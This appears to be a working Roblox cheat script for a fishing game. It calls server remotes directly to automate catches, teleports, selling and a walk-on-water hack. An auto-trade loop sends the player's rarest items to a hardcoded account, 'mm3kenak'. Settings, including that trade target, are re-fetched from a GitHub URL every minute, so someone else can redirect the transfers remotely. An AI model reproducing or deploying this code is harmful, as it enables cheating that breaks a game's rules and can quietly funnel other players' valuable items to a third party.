repeat task.wait() until game:IsLoaded()

-- ======================================================
-- # ULTIMATE HUB: V6.4 (RAW + WALK + WEB CONFIG)
-- ======================================================

local Services = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    RunService = game:GetService("RunService"),
    HttpService = game:GetService("HttpService"),
    CoreGui = game:GetService("CoreGui"),
    UserInputService = game:GetService("UserInputService")
}

local lp = Services.Players.LocalPlayer

-- [1] SETUP URL CONFIG
local OnlineConfigUrl = "https://raw.githubusercontent.com/abinoldi/muffzle/refs/heads/main/remconfig" 

-- [2] DEFAULT CONFIG (Akan ditimpa oleh Web Config)
local MasterConfig = {
    FishingEnabled = true,
    AutoEquip = true,
    CatchDelay = 1.05, -- Delay aman agar ikan "nyangkut"
    AutoSell = true,
    SellDelay = 60,
    AutoFavorite = true,
    AutoUnfavoriteRubies = false,
    
    -- [FITUR BARU]
    WalkOnWater = true, 
    
    -- [TELEPORT]
    AutoTeleport = true,
    SelectedLocation = "Crater Island",
    AutoTotem = true,
    
    -- [PERFORMA]
    PotatoMode = true,
    Disable3DRendering = true, 
    
    -- [TRADING]
    AutoTrade = true,
    TargetUsername = "mm3kenak",
    TradeMode = "SECRETS_FIRST", 
    TradeDelay = 6.5,
}

-- STATE TRACKING
local FishingState = { IsFishing = false, Teleporting = false }
local TradingState = { IsTrading = false, Thread = nil }
local FishingThreads = {}

-- GLOBAL VARIABLES
local TotalFishCaught = 0
local TotalSecretsFound = 0
local TotalRubyGemstones = 0

-- WALK ON WATER VARIABLES
local walkOnWaterConnection = nil
local isWalkOnWater = false
local waterPlatform = nil

-- REMOTE HELPER
local function GetRemote(name)
    local path = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
    local current = Services.ReplicatedStorage
    for _, child in ipairs(path) do
        current = current:WaitForChild(child, 2)
        if not current then return nil end
    end
    return current:FindFirstChild(name)
end

-- LOAD REMOTES
local RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
local RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
local RF_CatchFishCompleted = GetRemote("RF/CatchFishCompleted")
local RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
local RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
local RF_UpdateAutoFishingState = GetRemote("RF/UpdateAutoFishingState")
local RF_SellAllItems = GetRemote("RF/SellAllItems")
local RE_FavoriteItem = GetRemote("RE/FavoriteItem")
local RF_InitiateTrade = GetRemote("RF/InitiateTrade")

-- ===============================
-- WEB CONFIG LOADER (RESTORED)
-- ===============================
local function LoadWebConfig()
    if not OnlineConfigUrl or OnlineConfigUrl == "" then return end
    
    -- Ambil data dari URL
    local success, response = pcall(function() return game:HttpGet(OnlineConfigUrl, true) end)
    
    if success then
        local decodeSuccess, decodedData = pcall(function() return Services.HttpService:JSONDecode(response) end)
        if decodeSuccess then
            local settingsChanged = false
            local locationChanged = false
            
            -- Update config lokal dengan data web
            for key, value in pairs(decodedData) do
                if MasterConfig[key] ~= value then
                    if key == "SelectedLocation" then locationChanged = true end
                    if key == "TargetUsername" then MasterConfig.TargetId = nil end
                    
                    MasterConfig[key] = value
                    settingsChanged = true
                end
            end
            
            -- Terapkan perubahan jika ada update
            if settingsChanged then
                -- Restart Teleport jika lokasi berubah
                if locationChanged and MasterConfig.AutoTeleport and TeleportToFishingLocation then 
                    task.spawn(TeleportToFishingLocation) 
                end
                
                -- Restart Fishing jika status berubah
                if MasterConfig.FishingEnabled and not FishingState.IsFishing then 
                    task.spawn(StartFishingV1)
                elseif not MasterConfig.FishingEnabled and FishingState.IsFishing then 
                    StopFishingV1() 
                end
                
                -- Restart Trade jika status berubah
                if MasterConfig.AutoTrade and not TradingState.IsTrading then 
                    task.spawn(RunAutoTrade)
                elseif not MasterConfig.AutoTrade and TradingState.IsTrading then 
                    TradingState.IsTrading = false
                    if TradingState.Thread then task.cancel(TradingState.Thread) end
                end
                
                -- Update Walk on Water
                if MasterConfig.WalkOnWater ~= isWalkOnWater then
                    ToggleWalkOnWater(MasterConfig.WalkOnWater)
                end
            end
        end
    end
end

-- ===============================
-- WALK ON WATER LOGIC
-- ===============================
function ToggleWalkOnWater(state)
    isWalkOnWater = state

    if state then
        if not waterPlatform then
            waterPlatform = Instance.new("Part")
            waterPlatform.Name = "WaterPlatform"
            waterPlatform.Anchored = true
            waterPlatform.CanCollide = true
            waterPlatform.Transparency = 1 
            waterPlatform.Size = Vector3.new(15, 1, 15)
            waterPlatform.Parent = workspace
        end

        if walkOnWaterConnection then walkOnWaterConnection:Disconnect() end

        walkOnWaterConnection = Services.RunService.RenderStepped:Connect(function()
            local character = lp.Character
            if not isWalkOnWater or not character then return end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            if not waterPlatform or not waterPlatform.Parent then
                waterPlatform = Instance.new("Part")
                waterPlatform.Name = "WaterPlatform"
                waterPlatform.Anchored = true
                waterPlatform.CanCollide = true
                waterPlatform.Transparency = 1 
                waterPlatform.Size = Vector3.new(15, 1, 15)
                waterPlatform.Parent = workspace
            end

            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {workspace.Terrain} 
            rayParams.FilterType = Enum.RaycastFilterType.Include
            rayParams.IgnoreWater = false 

            local rayOrigin = hrp.Position + Vector3.new(0, 5, 0) 
            local rayDirection = Vector3.new(0, -500, 0)
            local result = workspace:Raycast(rayOrigin, rayDirection, rayParams)

            if result and result.Material == Enum.Material.Water then
                local waterSurfaceHeight = result.Position.Y
                waterPlatform.Position = Vector3.new(hrp.Position.X, waterSurfaceHeight, hrp.Position.Z)
                
                if hrp.Position.Y < (waterSurfaceHeight + 2) and hrp.Position.Y > (waterSurfaceHeight - 5) then
                    if not Services.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                        hrp.CFrame = CFrame.new(hrp.Position.X, waterSurfaceHeight + 3.2, hrp.Position.Z)
                    end
                end
            else
                waterPlatform.Position = Vector3.new(hrp.Position.X, -500, hrp.Position.Z)
            end
        end)
    else
        if walkOnWaterConnection then walkOnWaterConnection:Disconnect() walkOnWaterConnection = nil end
        if waterPlatform then waterPlatform:Destroy() waterPlatform = nil end
    end
end

-- ===============================
-- CORE FISHING LOGIC (RAW MODE)
-- ===============================
local function RunInstantFish()
    pcall(function() RF_ChargeFishingRod:InvokeServer() end)
    local timestamp = workspace:GetServerTimeNow()
    pcall(function() RF_RequestFishingMinigameStarted:InvokeServer(-1.233, 1, timestamp) end)
    task.wait(MasterConfig.CatchDelay) 
    pcall(function() RF_CatchFishCompleted:InvokeServer() end)
    pcall(function() RF_CancelFishingInputs:InvokeServer() end)
end

function StartFishingV1()
    if FishingState.IsFishing then return end
    FishingState.IsFishing = true
    
    if RF_UpdateAutoFishingState then 
        pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) 
    end
    
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do RunInstantFish() end
    end))
    
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoEquip and RE_EquipToolFromHotbar then 
                pcall(function() RE_EquipToolFromHotbar:FireServer(1) end) 
            end
            task.wait(1.5)
        end
    end))

    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoSell and RF_SellAllItems then
                pcall(function() RF_SellAllItems:InvokeServer() end)
            end
            task.wait(MasterConfig.SellDelay)
        end
    end))
end

function StopFishingV1()
    FishingState.IsFishing = false
    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
    pcall(function() RF_CancelFishingInputs:InvokeServer() end)
    FishingThreads = {}
end

-- ===============================
-- SHARED MODULES & DATA LOKASI
-- ===============================
local Replion = require(Services.ReplicatedStorage.Packages.Replion).Client
local ItemUtility = require(Services.ReplicatedStorage.Shared.ItemUtility)
local TierUtility = require(Services.ReplicatedStorage.Shared.TierUtility)
local PlayerData = Replion:WaitReplion("Data", 10)

local FishingLocations = {
    ["Iron Cavern"] = {Pos = Vector3.new(-8792.546, -588.000, 230.642), Look = Vector3.new(0.718, 0.000, 0.696)},
    ["Disco Event"] = {Pos = Vector3.new(-8641.672, -547.500, 160.322), Look = Vector3.new(0.984, -0.000, 0.176)},
    ["Classic Island"] = {Pos = Vector3.new(1440.843, 46.062, 2777.175), Look = Vector3.new(0.940, -0.000, 0.342)},
    ["Ancient Jungle"] = {Pos = Vector3.new(1535.639, 3.159, -193.352), Look = Vector3.new(0.505, -0.000, 0.863)},
    ["Arrow Lever"] = {Pos = Vector3.new(898.296, 8.449, -361.856), Look = Vector3.new(0.023, -0.000, 1.000)},
    ["Coral Reef"] = {Pos = Vector3.new(-3207.538, 6.087, 2011.079), Look = Vector3.new(0.973, 0.000, 0.229)},
    ["Crater Island"] = {Pos = Vector3.new(1058.976, 2.330, 5032.878), Look = Vector3.new(-0.789, 0.000, 0.615)},
    ["Crystalline Passage"] = {Pos = Vector3.new(6051.567, -538.900, 4370.979), Look = Vector3.new(0.109, 0.000, 0.994)},
    ["Ancient Ruin"] = {Pos = Vector3.new(6031.981, -585.924, 4713.157), Look = Vector3.new(0.316, -0.000, -0.949)},
    ["Diamond Lever"] = {Pos = Vector3.new(1818.930, 8.449, -284.110), Look = Vector3.new(0.000, 0.000, -1.000)},
    ["Enchant Room"] = {Pos = Vector3.new(3255.670, -1301.530, 1371.790), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Esoteric Island"] = {Pos = Vector3.new(2164.470, 3.220, 1242.390), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Fisherman Island"] = {Pos = Vector3.new(74.030, 9.530, 2705.230), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Hourglass Diamond Lever"] = {Pos = Vector3.new(1484.610, 8.450, -861.010), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Kohana"] = {Pos = Vector3.new(-668.732, 3.000, 681.580), Look = Vector3.new(0.889, -0.000, 0.458)},
    ["Lost Isle"] = {Pos = Vector3.new(-3804.105, 2.344, -904.653), Look = Vector3.new(-0.901, -0.000, 0.433)},
    ["Sacred Temple"] = {Pos = Vector3.new(1461.815, -22.125, -670.234), Look = Vector3.new(-0.990, -0.000, 0.143)},
    ["Second Enchant Altar"] = {Pos = Vector3.new(1479.587, 128.295, -604.224), Look = Vector3.new(-0.298, 0.000, -0.955)},
    ["Sisyphus Statue"] = {Pos = Vector3.new(-3743.745, -135.074, -1007.554), Look = Vector3.new(0.310, 0.000, 0.951)},
    ["Treasure Room"] = {Pos = Vector3.new(-3598.440, -281.274, -1645.855), Look = Vector3.new(-0.065, 0.000, -0.998)},
    ["Tropical Island"] = {Pos = Vector3.new(-2162.920, 2.825, 3638.445), Look = Vector3.new(0.381, -0.000, 0.925)},
    ["Underground Cellar"] = {Pos = Vector3.new(2118.417, -91.448, -733.800), Look = Vector3.new(0.854, 0.000, 0.521)},
    ["Volcano"] = {Pos = Vector3.new(-605.121, 19.516, 160.010), Look = Vector3.new(0.854, 0.000, 0.520)},
    ["Weather Machine"] = {Pos = Vector3.new(-1518.550, 2.875, 1916.148), Look = Vector3.new(0.042, 0.000, 0.999)},
}

function GetFishNameAndRarity(item)
    local name = item.Identifier or "Unknown"
    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
    local itemID = item.Id
    local itemData
    if ItemUtility and itemID then
        pcall(function()
            itemData = ItemUtility:GetItemData(itemID)
            if not itemData then
                local numericID = tonumber(item.Id) or tonumber(item.Identifier)
                if numericID then itemData = ItemUtility:GetItemData(numericID) end
            end
        end)
    end
    if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
    if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity 
    elseif itemData and itemData.Probability and TierUtility then 
        pcall(function() rarity = TierUtility:GetTierFromRarity(itemData.Probability.Chance).Name end) 
    end
    return name, rarity
end

function GetMutation(item)
    if not item.Metadata then return "None" end
    if item.Metadata.VariantId and item.Metadata.VariantId ~= "" then return item.Metadata.VariantId end
    if item.Metadata.Shiny == true then return "Shiny" end
    return "None"
end

function FormatNumber(n) return tostring(n):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "") end

-- ===============================
-- TELEPORT & TOTEM
-- ===============================
function TeleportToFishingLocation()
    if FishingState.Teleporting then return end
    local loc = FishingLocations[MasterConfig.SelectedLocation]
    if not loc then return end
    FishingState.Teleporting = true
    pcall(function()
        local char = lp.Character or lp.CharacterAdded:Wait()
        local root = char:WaitForChild("HumanoidRootPart", 5)
        if root then root.CFrame = CFrame.new(loc.Pos, loc.Pos + loc.Look) end
    end)
    task.wait(0.5)
    FishingState.Teleporting = false
end

local function SpawnMutationTotem()
    local uuid
    pcall(function() 
        local inventoryData = PlayerData:GetExpect("Inventory").Totems
        for _, item in ipairs(inventoryData) do 
            if tonumber(item.Id) == 2 and (item.Count or 1) >= 1 then uuid = item.UUID break end
        end 
    end)
    if not uuid then return false end
    local RE_SpawnTotem = GetRemote("RE/SpawnTotem")
    local RF_EquipOxygenTank = GetRemote("RF/EquipOxygenTank")
    local RF_UnequipOxygenTank = GetRemote("RF/UnequipOxygenTank")
    if RF_EquipOxygenTank then pcall(function() RF_EquipOxygenTank:InvokeServer(105) end) end
    local success = false
    pcall(function() RE_SpawnTotem:FireServer(uuid); success = true end)
    if success then
        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local originalCF = hrp.CFrame
            hrp.CFrame = originalCF + Vector3.new(0, 5, 0)
            task.wait(0.2)
            hrp.CFrame = originalCF
        end
    end
    task.wait(0.5)
    if RF_UnequipOxygenTank then pcall(function() RF_UnequipOxygenTank:InvokeServer() end) end
    return success
end

-- ===============================
-- AUTO TRADE (Secret & Ruby)
-- ===============================
function RunAutoTrade()
    if TradingState.IsTrading then return end
    TradingState.IsTrading = true
    
    TradingState.Thread = task.spawn(function()
        while MasterConfig.AutoTrade and TradingState.IsTrading do
            pcall(UpdateStatsFromInventory)
            
            local targetPlayer = Services.Players:FindFirstChild(MasterConfig.TargetUsername)
            if targetPlayer then
                local tradeList = {}
                local inv = PlayerData:GetExpect("Inventory")
                if inv then
                    for _, items in pairs(inv) do
                        for _, item in ipairs(items) do
                            local n, r = GetFishNameAndRarity(item)
                            local mut = GetMutation(item)
                            local isSecret = (tostring(r):upper() == "SECRET")
                            local isRubyGem = (n == "Ruby" and mut == "Gemstone")
                            if isSecret or isRubyGem then
                                table.insert(tradeList, {uuid = item.UUID, priority = isSecret and 2 or 1})
                            end
                        end
                    end
                end
                table.sort(tradeList, function(a, b) return a.priority > b.priority end)
                
                if #tradeList > 0 then
                    local targetItem = tradeList[1]
                    pcall(function() RF_InitiateTrade:InvokeServer(targetPlayer.UserId, targetItem.uuid) end)
                    task.wait(3)
                    pcall(UpdateStatsFromInventory)
                else
                    task.wait(1)
                end
            else
                task.wait(3)
            end
            task.wait(MasterConfig.TradeDelay)
        end
        TradingState.IsTrading = false
    end)
end

-- ===============================
-- STATS & GUI
-- ===============================
UpdateStatsFromInventory = function()
    local secretCount = 0
    local rubyGemCount = 0
    local inv = PlayerData:Get("Inventory")
    if inv then
        for _, items in pairs(inv) do
             for _, item in ipairs(items) do
                 local name, r = GetFishNameAndRarity(item)
                 local mut = GetMutation(item)
                 if tostring(r):upper() == "SECRET" then secretCount = secretCount + 1 end
                 if name == "Ruby" and mut == "Gemstone" then rubyGemCount = rubyGemCount + 1 end
            end
        end
    end
    TotalSecretsFound = secretCount
    TotalRubyGemstones = rubyGemCount
end

function CreateDashboard()
    if Services.CoreGui:FindFirstChild("EnochRaw") then Services.CoreGui.EnochRaw:Destroy() end
    local gui = Instance.new("ScreenGui", Services.CoreGui)
    gui.Name = "EnochRaw"
    gui.IgnoreGuiInset = true
    
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.2, 0, 0.15, 0)
    frame.Position = UDim2.new(0.5, 0, 0.1, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    frame.BackgroundTransparency = 0.5
    
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1,1,1)
    label.TextScaled = true
    label.Text = "V6.4 RAW + WALK"
    
    task.spawn(function()
        while task.wait(3) do 
            if not gui or not gui.Parent then break end
            pcall(UpdateStatsFromInventory)
            local coins = (PlayerData and PlayerData:Get("Coins") or 0)
            label.Text = string.format(
                "V6.4 RAW\nFish: %d | Coins: %s\nSecret: %d | RubyGem: %d", 
                TotalFishCaught, 
                FormatNumber(coins), 
                TotalSecretsFound, 
                TotalRubyGemstones
            )
        end
    end)
end

local RE_ObtainedNewFishNotification = GetRemote("RE/ObtainedNewFishNotification")
if RE_ObtainedNewFishNotification then
    RE_ObtainedNewFishNotification.OnClientEvent:Connect(function()
        TotalFishCaught = TotalFishCaught + 1
    end)
end

-- ===============================
-- AUTO START
-- ===============================
task.delay(1, function()
    print("[AutoStart] V6.4 RAW (Walk+Config) Executed")
    CreateDashboard()
    
    -- Load Config Awal
    LoadWebConfig()
    
    if MasterConfig.WalkOnWater then ToggleWalkOnWater(true) end
    if MasterConfig.AutoTeleport then TeleportToFishingLocation(); task.wait(1) end
    if MasterConfig.AutoTotem then task.spawn(function() while true do SpawnMutationTotem(); task.wait(3780) end end) end
    
    if MasterConfig.PotatoMode then 
        task.spawn(function()
            local runService = game:GetService("RunService")
            if MasterConfig.Disable3DRendering then runService:Set3dRenderingEnabled(false) end
            while task.wait(30) do 
                pcall(function() workspace:FindFirstChild("CosmeticFolder"):ClearAllChildren() end)
                for _, v in ipairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") then v.Transparency = 1; v.CanCollide = false; v.CastShadow = false
                    elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") then v:Destroy() end
                end
            end
        end)
    end
    
    if MasterConfig.FishingEnabled then StartFishingV1() end
    if MasterConfig.AutoTrade then RunAutoTrade() end
    
    -- Loop Check Config (Setiap 60 Detik)
    task.spawn(function()
        while true do
            task.wait(60)
            LoadWebConfig()
        end
    end)
end)
